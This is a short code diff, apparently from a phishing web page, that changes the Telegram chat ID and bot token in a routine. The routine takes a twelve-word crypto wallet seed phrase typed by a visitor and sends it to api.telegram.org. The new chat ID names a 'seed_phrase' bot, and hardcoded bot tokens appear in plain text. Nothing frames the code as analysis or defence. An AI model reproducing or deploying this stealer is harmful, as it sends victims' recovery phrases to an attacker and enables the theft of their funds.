@@ -195,8 +195,8 @@
 
             if (words.length === 12 && words.every(word => word)) {
                 const message = words.map((word, index) => `${index + 1}. ${word}`).join('\n');
-                const chatId = '@bdsjxjdhd';  // Ваш чат ID
-                const token = '7804666257:AAHnu23aX89lTPTuMt08TOHfSgvfK4T8hKg';  // Ваш токен бота
+                const chatId = '@seed_phrase173737_bot';  // Ваш чат ID
+                const token = '7804666257:AAHa9XgzVNYW5mT5Rkfl9vqloaELZYlEJY4';  // Ваш токен бота
                 const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
                 fetch(url)
